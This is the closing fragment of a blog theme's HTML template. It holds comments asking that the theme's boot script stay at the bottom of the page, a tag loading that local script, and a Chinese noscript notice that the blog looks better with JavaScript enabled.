<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
